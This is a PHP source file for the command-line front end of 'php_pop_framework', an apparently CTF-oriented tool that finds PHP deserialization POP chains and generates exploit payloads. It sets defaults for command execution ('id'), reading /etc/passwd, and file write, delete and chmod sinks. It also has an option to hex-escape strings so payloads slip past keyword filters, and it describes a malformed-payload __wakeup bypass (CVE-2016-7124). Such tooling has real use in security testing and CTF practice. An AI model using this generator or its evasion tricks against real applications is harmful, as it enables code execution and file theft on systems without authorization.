<?php
declare(strict_types=1);

namespace PopChain\Cli;

use PopChain\Analysis\ChainFinder;
use PopChain\Analysis\SinkScanner;
use PopChain\Model\Chain;
use PopChain\Parser\ProjectParser;
use PopChain\Payload\PayloadBuilder;

/**
 * 统一 CLI 入口。根目录 popchain 与 bin/popchain 都调用这里。
 */
final class Application
{
    public const VERSION = '1.3.0';

    private const DEFAULT_ENTRIES = ['__destruct', '__wakeup', '__unserialize'];

    /** --entry=all 时启用的全部魔术方法入口。 */
    private const ALL_ENTRIES = [
        '__destruct', '__wakeup', '__unserialize',
        '__toString', '__invoke', '__call', '__get', '__isset', '__clone',
    ];

    /** 不带值的布尔选项。 */
    private const BOOLEAN_OPTIONS = ['json', 'stdin', 'include-vendor', 'obfuscate', 'help', 'version'];

    /** 必须是正整数的选项。 */
    private const NUMERIC_OPTIONS = ['max-depth', 'max-chains'];

    /** 反序列化时会被自动调用的入口；其余魔术方法需要外部触发。 */
    private const DESERIALIZE_ENTRIES = ['__destruct', '__wakeup', '__unserialize'];

    /** sink 分类 => 对应取值选项；未写时再用 DEFAULT_VALUES 的默认值。 */
    private const CATEGORY_OPTIONS = [
        'rce' => 'cmd',
        'file_read' => 'read-file',
        'include' => 'read-file',
        'file_write' => 'write-file',
        'file_delete' => 'delete-file',
        'file_move' => 'move-file',
        'file_copy' => 'move-file',
        'file_perms' => 'chmod-file',
        'ssrf' => 'ssrf-url',
        'env' => 'env-value',
        'var' => 'var-value',
        'mail' => 'mail-to',
        'deserialize' => 'serialized',
    ];

    /** 没有给选项时，按 sink 分类给一个合适的默认值。 */
    private const DEFAULT_VALUES = [
        'rce' => 'id',
        'file_read' => '/etc/passwd',
        'file_write' => '/tmp/popchain.txt',
        'file_delete' => '/tmp/popchain.txt',
        'file_move' => '/tmp/popchain.txt',
        'file_copy' => '/tmp/popchain.txt',
        'file_perms' => '/tmp/popchain.txt',
        'include' => '/etc/passwd',
        'deserialize' => 'a:0:{}',
        'ssrf' => 'http://127.0.0.1/',
        'env' => 'POPCHAIN=1',
        'var' => 'popchain=1',
        'mail' => 'a@b.test',
    ];

    private const MESSAGES = [
        'en' => [
            'scanning' => 'Scanning: {path}',
            'classes' => 'Classes: {count}',
            'magic' => 'Magic methods: ',
            'sink' => 'sink: ',
            'entries' => 'Entries: ',
            'no_chains' => 'No chains found. Try:',
            'try_entries' => '  - relax entries: --entry=all',
            'try_depth' => '  - increase depth: --max-depth=12',
            'try_class' => '  - target a class: --class=Name',
            'payload_written' => '[+] payload written to {file}',
            'unknown_command' => 'Unknown command: {command}',
            'stdin_empty' => 'No content received from stdin',
            'url_scheme' => '--url only accepts http(s): {url}',
            'download_failed' => 'Download failed: {url} (page may require login or is not raw PHP source)',
            'path_missing' => 'Path not found: {path}',
            'bad_numeric' => '--{option} must be a positive integer, got: {value}',
            'no_classes' => 'No PHP classes found in: {path}',
            'output_failed' => 'Cannot write output file: {file}',
            'external_entry' => 'note: this entry needs an external trigger; unserializing the payload alone will not call it',
            'incomplete_payload' => 'note: the sink value could not be placed in the payload; adjust the chain by hand',
            'wakeup_bypass' => 'note: this property is reset by __wakeup; the payload is deliberately malformed (declared property count > actual) so unserialize fails and __wakeup is skipped while destructors still run (CVE-2016-7124/SplDoublyLinkedList-style bypass)',
            'arg' => 'arg',
            'via' => 'via',
        ],
        'zh' => [
            'scanning' => '扫描: {path}',
            'classes' => '类数量: {count}',
            'magic' => '魔术方法: ',
            'sink' => 'sink: ',
            'entries' => '入口: ',
            'no_chains' => '未找到链。可尝试：',
            'try_entries' => '  - 放宽入口：--entry=all',
            'try_depth' => '  - 提高深度：--max-depth=12',
            'try_class' => '  - 指定类：--class=类名',
            'payload_written' => '[+] payload 已写入 {file}',
            'unknown_command' => '未知命令: {command}',
            'stdin_empty' => '从 stdin 读取不到内容',
            'url_scheme' => '--url 只接受 http(s) 地址: {url}',
            'download_failed' => '下载失败: {url}（页面可能需要登录，或不是纯 PHP 源码）',
            'path_missing' => '路径不存在: {path}',
            'bad_numeric' => '--{option} 必须是正整数，当前值: {value}',
            'no_classes' => '没有在 {path} 里找到 PHP 类',
            'output_failed' => '无法写入输出文件: {file}',
            'external_entry' => '注意：该入口需要外部触发，单独反序列化 payload 不会调用它',
            'incomplete_payload' => '注意：sink 的值没能写进 payload，需要手工调整这条链',
            'wakeup_bypass' => '注意：这个属性会被 __wakeup 重置；payload 故意写成不合法（声明属性数大于实际），让 unserialize 失败、__wakeup 跳过而析构照跑（CVE-2016-7124）',
            'arg' => '参数',
            'via' => 'via',
        ],
    ];

    private static string $lang = 'en';

    /** @param list<string> $argv */
    public static function run(array $argv): int
    {
        [$positional, $options] = self::parseArgs($argv);
        self::$lang = self::resolveLang($options);

        $command = $positional[0] ?? 'help';

        if (in_array($command, ['help', '--help', '-h'], true)) {
            self::help();
            return 0;
        }
        if (in_array($command, ['version', '--version', '-v'], true)) {
            echo 'php_pop_framework ', self::VERSION, "\n";
            return 0;
        }

        if (!in_array($command, ['scan', 'find'], true)) {
            fwrite(STDERR, self::t('unknown_command', ['command' => $command]) . "\n\n");
            self::help();
            return 2;
        }

        foreach (self::NUMERIC_OPTIONS as $name) {
            if (!isset($options[$name]) || $options[$name] === true) {
                continue;
            }
            $value = (string) $options[$name];
            if (!preg_match('/^\d+$/', $value) || (int) $value < 1) {
                fwrite(STDERR, '[!] ' . self::t('bad_numeric', ['option' => $name, 'value' => $value]) . "\n");
                return 2;
            }
        }

        try {
            [$path, $label, $temporary] = self::resolveInput($positional, $options);
        } catch (\RuntimeException $e) {
            fwrite(STDERR, '[!] ' . $e->getMessage() . "\n");
            return 2;
        }

        try {
            return $command === 'scan'
                ? self::scan($path, $label, $options)
                : self::find($path, $label, $options);
        } finally {
            if ($temporary !== null) {
                @unlink($temporary);
            }
        }
    }

    /**
     * 解析输入来源：本地文件/目录、stdin 或 URL。
     *
     * @return array{0:string,1:string,2:?string} [路径, 展示名, 临时文件]
     */
    private static function resolveInput(array $positional, array $options): array
    {
        if (isset($options['stdin'])) {
            $code = stream_get_contents(STDIN);
            if ($code === false || $code === '') {
                throw new \RuntimeException(self::t('stdin_empty'));
            }
            $path = self::temporaryFile($code);
            return [$path, '(stdin)', $path];
        }

        if (isset($options['url'])) {
            $url = (string) $options['url'];
            if (!preg_match('#^https?://#i', $url)) {
                throw new \RuntimeException(self::t('url_scheme', ['url' => $url]));
            }
            $code = @file_get_contents($url);
            if ($code === false) {
                throw new \RuntimeException(self::t('download_failed', ['url' => $url]));
            }
            $path = self::temporaryFile($code);
            return [$path, $url, $path];
        }

        $path = $positional[1] ?? '.';
        if (!file_exists($path)) {
            throw new \RuntimeException(self::t('path_missing', ['path' => $path]));
        }
        return [$path, $path, null];
    }

    private static function temporaryFile(string $content): string
    {
        $path = tempnam(sys_get_temp_dir(), 'popchain_');
        if ($path === false) {
            throw new \RuntimeException('Cannot create temporary file');
        }
        file_put_contents($path, $content);
        return $path;
    }

    /** @param list<string> $argv @return array{0:list<string>,1:array<string,mixed>} */
    private static function parseArgs(array $argv): array
    {
        $positional = [];
        $options = [];
        $args = array_slice($argv, 1);
        $count = count($args);

        for ($i = 0; $i < $count; $i++) {
            $arg = $args[$i];
            if (!str_starts_with($arg, '--')) {
                $positional[] = $arg;
                continue;
            }

            $name = substr($arg, 2);
            if (str_contains($name, '=')) {
                [$key, $value] = explode('=', $name, 2);
                $options[$key] = $value;
                continue;
            }

            if (in_array($name, self::BOOLEAN_OPTIONS, true)) {
                $options[$name] = true;
                continue;
            }

            if ($i + 1 < $count && !str_starts_with($args[$i + 1], '--')) {
                $options[$name] = $args[++$i];
                continue;
            }

            $options[$name] = true;
        }
        return [$positional, $options];
    }

    private static function resolveLang(array $options): string
    {
        $lang = strtolower((string) self::option($options, 'lang', 'en'));
        return in_array($lang, ['en', 'zh'], true) ? $lang : 'en';
    }

    private static function t(string $key, array $replace = []): string
    {
        $text = self::MESSAGES[self::$lang][$key]
            ?? self::MESSAGES['en'][$key]
            ?? $key;
        foreach ($replace as $name => $value) {
            $text = str_replace('{' . $name . '}', (string) $value, $text);
        }
        return $text;
    }

    private static function option(array $options, string $name, mixed $default = null): mixed
    {
        return $options[$name] ?? $default;
    }

    private static function help(): void
    {
        echo self::$lang === 'zh' ? self::helpZh() : self::helpEn();
    }

    private static function helpEn(): string
    {
        $version = self::VERSION;
        return <<<TXT
php_pop_framework v{$version} — PHP deserialization POP chain generator
Author: guaidao2 & coolmoon    License: MIT

Usage:
  popchain scan <path|file> [options]    Scan classes, magic methods and sinks
  popchain find <path|file> [options]    Find chains and build payloads
  popchain find --stdin [options]        Read PHP source from stdin
  popchain find --url=<url> [options]    Fetch PHP source from a URL
  popchain version                       Show version

Input:
  The positional argument can be a single .php file or a directory.

Options:
  --lang=en|zh         Output language (default: en)
  --entry=a,b          Entry magic methods, default __destruct,__wakeup,__unserialize
                       --entry=all enables every magic method
  --class=Entry        Only keep chains whose entry class matches
  --sink=system        Only keep chains hitting the given sink
  --cmd=value          Value for RCE sinks (default: id)
  --read-file=path     Value for file read / include sinks (default: /etc/passwd)
  --write-file=path    Value for file write sinks (default: /tmp/popchain.txt)
  --delete-file=path   Value for file delete sinks (default: /tmp/popchain.txt)
  --move-file=path     Value for file move / copy sinks (default: /tmp/popchain.txt)
  --chmod-file=path    Value for chmod sinks (default: /tmp/popchain.txt)
  --ssrf-url=url       Value for SSRF sinks such as simplexml_load_file / get_headers (default: http://127.0.0.1/)
  --env-value=text     Value for putenv sinks (default: POPCHAIN=1)
  --var-value=text     Value for parse_str sinks (default: popchain=1)
  --mail-to=address    Value for mail sinks (default: a@b.test)
  --serialized=data    Value for unserialize sinks (default: a:0:{})
  --output=file        Write payloads to a file (JSON in --json mode)
  --max-depth=8        Maximum chain depth
  --max-chains=50      Maximum number of chains
  --include-vendor     Also scan vendor/
  --json               JSON output
  --obfuscate          Emit strings as S: hex escapes, hiding keywords from regex filters

Examples:
  popchain scan ./src
  popchain find ./chal.php --cmd='id'
  cat chal.php | popchain find --stdin --cmd='id'
  popchain find --url=https://example.com/chal.php --cmd='id'
  popchain find ./src --class=Entry --sink=system --cmd='id'
  popchain find ./src --sink=file_get_contents --read-file=/flag
  popchain find ./src --entry=all --output=payloads.txt
  popchain find ./src --lang=zh

TXT;
    }

    private static function helpZh(): string
    {
        $version = self::VERSION;
        return <<<TXT
php_pop_framework v{$version} — PHP 反序列化 POP 链自动生成器
作者: guaidao2 & coolmoon   协议: MIT

用法:
  popchain scan <路径|文件> [选项]    扫描类、魔术方法与危险 sink
  popchain find <路径|文件> [选项]    搜索链并生成 payload
  popchain find --stdin [选项]        从标准输入读取 PHP 源码
  popchain find --url=<地址> [选项]   从 URL 拉取 PHP 源码
  popchain version                    显示版本

输入:
  位置参数可以是单个 .php 文件、目录，或配合 --stdin / --url

选项:
  --lang=en|zh         输出语言（默认 en）
  --entry=a,b          入口魔术方法，默认 __destruct,__wakeup,__unserialize
                       --entry=all 启用全部魔术方法入口
  --class=Entry        只保留指定类（短名或完整命名空间）作为入口的链
  --sink=system        只保留指定 sink 函数的链
  --cmd=值             命令执行类 sink 的写入值（默认 id）
  --read-file=路径     文件读取 / 包含类 sink 的写入值（默认 /etc/passwd）
  --write-file=路径    文件写入类 sink 的写入值（默认 /tmp/popchain.txt）
  --delete-file=路径   文件删除类 sink 的写入值（默认 /tmp/popchain.txt）
  --move-file=路径     文件移动 / 复制类 sink 的写入值（默认 /tmp/popchain.txt）
  --chmod-file=路径    chmod 类 sink 的写入值（默认 /tmp/popchain.txt）
  --ssrf-url=地址      SSRF 类 sink（simplexml_load_file / get_headers 等）的写入值（默认 http://127.0.0.1/）
  --env-value=文本     putenv 类 sink 的写入值（默认 POPCHAIN=1）
  --var-value=文本     parse_str 类 sink 的写入值（默认 popchain=1）
  --mail-to=地址       mail 类 sink 的写入值（默认 a@b.test）
  --serialized=数据    unserialize 类 sink 的写入值（默认 a:0:{}）
  --output=文件        把 payload 写入文件（JSON 模式写 JSON）
  --max-depth=8        链最大深度
  --max-chains=50      最多输出多少条链
  --include-vendor     连 vendor/ 目录一起扫描
  --json               以 JSON 输出
  --obfuscate          字符串改用 S: 十六进制转义，绕过关键字过滤

示例:
  popchain scan ./src
  popchain find ./chal.php --cmd='id'
  cat chal.php | popchain find --stdin --cmd='id'
  popchain find --url=https://example.com/chal.php --cmd='id'
  popchain find ./src --class=Entry --sink=system --cmd='id'
  popchain find ./src --sink=file_get_contents --read-file=/flag
  popchain find ./src --entry=all --output=payloads.txt
  popchain find ./src --lang=zh

TXT;
    }

    private static function scan(string $path, string $label, array $options): int
    {
        $parser = new ProjectParser((bool) self::option($options, 'include-vendor', false));
        $classes = $parser->parsePath($path);
        $scanner = new SinkScanner();

        if ($classes === []) {
            fwrite(STDERR, '[!] ' . self::t('no_classes', ['path' => $label]) . "\n");
            foreach ($parser->warnings() as $warning) {
                fwrite(STDERR, '[warn] ' . $warning . "\n");
            }
            return 2;
        }

        $rows = [];
        foreach ($classes as $class) {
            $magic = [];
            $sinks = [];
            foreach ($class->methods as $method) {
                if ($method->magic) {
                    $magic[] = $method->name;
                }
                foreach ($scanner->hitsIn($method) as $hit) {
                    if ($hit->category === 'callable') {
                        continue;
                    }
                    if ($scanner->isControllable($hit, $method)) {
                        $sinks[] = sprintf(
                            '%s::%s → %s() %s #%d ← %s',
                            $class->shortName(),
                            $method->name,
                            $hit->function,
                            self::t('arg'),
                            $hit->position,
                            $hit->arg->describe(),
                        );
                    }
                }
            }
            $rows[] = [
                'class' => $class->name,
                'trait' => $class->trait,
                'interface' => $class->interface,
                'enum' => $class->enum,
                'file' => $class->file,
                'line' => $class->line,
                'parent' => $class->parent,
                'magic' => $magic,
                'properties' => array_map(
                    static fn ($p): array => ['name' => $p->name, 'visibility' => $p->visibility, 'default' => $p->defaultRaw],
                    $class->properties,
                ),
                'sinks' => $sinks,
            ];
        }

        if (self::option($options, 'json', false)) {
            echo json_encode([
                'tool' => 'php_pop_framework',
                'version' => self::VERSION,
                'path' => $label,
                'classes' => $rows,
                'warnings' => $parser->warnings(),
            ], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE), "\n";
            return 0;
        }

        echo self::t('scanning', ['path' => $label]), "\n";
        echo self::t('classes', ['count' => count($classes)]), "\n\n";

        foreach ($rows as $row) {
            $kind = $row['trait'] ? ' (trait)' : ($row['interface'] ? ' (interface)' : ($row['enum'] ? ' (enum)' : ''));
            printf(
                "%s%s%s  (%s:%d)\n",
                $row['class'],
                $row['parent'] !== null ? ' extends ' . $row['parent'] : '',
                $kind,
                basename((string) $row['file']),
                $row['line'],
            );
            if ($row['magic'] !== []) {
                echo '  ', self::t('magic'), implode(', ', $row['magic']), "\n";
            }
            foreach ($row['sinks'] as $sink) {
                echo '  ', self::t('sink'), $sink, "\n";
            }
            echo "\n";
        }

        foreach ($parser->warnings() as $warning) {
            echo '[warn] ', $warning, "\n";
        }

        return 0;
    }

    private static function find(string $path, string $label, array $options): int
    {
        $parser = new ProjectParser((bool) self::option($options, 'include-vendor', false));
        $classes = $parser->parsePath($path);

        if ($classes === []) {
            fwrite(STDERR, '[!] ' . self::t('no_classes', ['path' => $label]) . "\n");
            foreach ($parser->warnings() as $warning) {
                fwrite(STDERR, '[warn] ' . $warning . "\n");
            }
            return 2;
        }

        $entries = self::entries($options);

        $finder = new ChainFinder($classes, new SinkScanner());
        $chains = $finder->find(
            $entries,
            (int) self::option($options, 'max-depth', 8),
            (int) self::option($options, 'max-chains', 50),
        );

        $classFilter = self::option($options, 'class');
        if (is_string($classFilter) && $classFilter !== '') {
            $wanted = strtolower(ltrim($classFilter, '\\'));
            $chains = array_values(array_filter(
                $chains,
                static fn (Chain $chain): bool => strtolower($chain->entryClass->name) === $wanted
                    || strtolower($chain->entryClass->shortName()) === $wanted,
            ));
        }

        $sinkFilter = self::option($options, 'sink');
        if (is_string($sinkFilter) && $sinkFilter !== '') {
            $chains = array_values(array_filter(
                $chains,
                static fn (Chain $chain): bool => $chain->sink !== null
                    && strcasecmp($chain->sink->function, $sinkFilter) === 0,
            ));
        }

        $builder = new PayloadBuilder($classes, (bool) self::option($options, 'obfuscate', false));
        $legacyValue = self::option($options, 'cmd', null);

        $records = [];
        foreach ($chains as $chain) {
            $category = $chain->sink?->category;
            $value = self::valueFor($category, $options, $legacyValue);
            $payloadString = $builder->build($chain, $value);
            $records[] = [
                'entry' => $chain->entryClass->name . '::' . $chain->entryMethod->name,
                'standalone' => in_array(strtolower($chain->entryMethod->name), self::DESERIALIZE_ENTRIES, true),
                'nodes' => $chain->nodes(),
                'edges' => array_map(static fn ($edge): array => [
                    'from' => $edge->fromClass->name . '::' . $edge->fromMethod->name,
                    'to' => $edge->toClass->name . '::' . $edge->toMethod->name,
                    'via' => $edge->viaKind,
                    'property' => $edge->viaProperty,
                    'line' => $edge->line,
                ], $chain->edges),
                'sink' => $chain->sink === null ? null : [
                    'function' => $chain->sink->function,
                    'category' => $chain->sink->category,
                    'position' => $chain->sink->position,
                    'arg' => $chain->sink->arg->describe(),
                ],
                'payload' => $payloadString,
                'payload_complete' => $builder->sinkValueWritten,
                'needs_wakeup_bypass' => $builder->wakeupBypassUsed,
            ];
        }

        $outputFile = self::option($options, 'output');
        if (is_string($outputFile) && $outputFile !== '') {
            $content = self::option($options, 'json', false)
                ? json_encode(['tool' => 'php_pop_framework', 'version' => self::VERSION, 'path' => $label, 'chains' => $records], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE)
                : implode("\n", array_column($records, 'payload'));
            if (@file_put_contents($outputFile, $content . "\n") === false) {
                fwrite(STDERR, '[!] ' . self::t('output_failed', ['file' => $outputFile]) . "\n");
                return 2;
            }
            fwrite(STDERR, self::t('payload_written', ['file' => $outputFile]) . "\n");
        }

        if (self::option($options, 'json', false)) {
            echo json_encode([
                'tool' => 'php_pop_framework',
                'version' => self::VERSION,
                'path' => $label,
                'chains' => $records,
                'warnings' => $parser->warnings(),
            ], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE), "\n";
            return $records === [] ? 1 : 0;
        }

        echo self::t('scanning', ['path' => $label]), "\n";
        echo self::t('classes', ['count' => count($classes)]), "\n";
        echo self::t('entries'), implode(', ', $entries), "\n\n";

        if ($records === []) {
            echo self::t('no_chains'), "\n";
            echo self::t('try_entries'), "\n";
            echo self::t('try_depth'), "\n";
            echo self::t('try_class'), "\n\n";
            return 1;
        }

        foreach ($records as $index => $record) {
            printf("[%d] %s\n", $index + 1, implode(' → ', $record['nodes']));
            if (!$record['standalone']) {
                echo '    ', self::t('external_entry'), "\n";
            }
            if ($record['sink'] !== null && !$record['payload_complete']) {
                echo '    ', self::t('incomplete_payload'), "\n";
            }
            if ($record['needs_wakeup_bypass']) {
                echo '    ', self::t('wakeup_bypass'), "\n";
            }
            foreach ($record['edges'] as $edge) {
                printf(
                    "    %s %-14s \$this->%-14s %s:%d\n",
                    self::t('via'),
                    $edge['via'],
                    $edge['property'],
                    self::shortName(explode('::', $edge['from'])[0]),
                    $edge['line'],
                );
            }
            if ($record['sink'] !== null) {
                printf(
                    "    sink %-8s %s() %s #%d ← %s\n",
                    $record['sink']['category'],
                    $record['sink']['function'],
                    self::t('arg'),
                    $record['sink']['position'],
                    $record['sink']['arg'],
                );
            }
            echo '    payload: ', self::displayable($record['payload']), "\n\n";
        }

        foreach ($parser->warnings() as $warning) {
            echo '[warn] ', $warning, "\n";
        }

        return 0;
    }

    /** @return list<string> */
    private static function entries(array $options): array
    {
        $entry = (string) self::option($options, 'entry', '');
        if ($entry === 'all') {
            return self::ALL_ENTRIES;
        }
        if ($entry === '') {
            return self::DEFAULT_ENTRIES;
        }
        return array_values(array_filter(array_map('trim', explode(',', $entry))));
    }

    /** 终端展示用：把 payload 里的 NUL 字节转义，避免复制/管道被当二进制。 */
    /**
     * 按 sink 分类取 payload 值：专用选项 > 兼容的 --cmd > 分类默认值。
     *
     * @param array<string, mixed> $options
     */
    private static function valueFor(?string $category, array $options, mixed $legacyValue): string
    {
        $optionName = $category !== null ? (self::CATEGORY_OPTIONS[$category] ?? null) : null;

        if ($optionName !== null) {
            $specific = self::option($options, $optionName, null);
            if (is_string($specific) && $specific !== '') {
                return $specific;
            }
        }

        if (is_string($legacyValue) && $legacyValue !== '') {
            return $legacyValue;
        }

        return self::defaultValue($category);
    }

    private static function defaultValue(?string $category): string
    {
        if ($category !== null && isset(self::DEFAULT_VALUES[$category])) {
            return self::DEFAULT_VALUES[$category];
        }
        return 'id';
    }

    private static function displayable(string $payload): string
    {
        return str_replace("\0", '\0', $payload);
    }

    private static function shortName(string $fqcn): string
    {
        $pos = strrpos($fqcn, '\\');
        return $pos === false ? $fqcn : substr($fqcn, $pos + 1);
    }
}
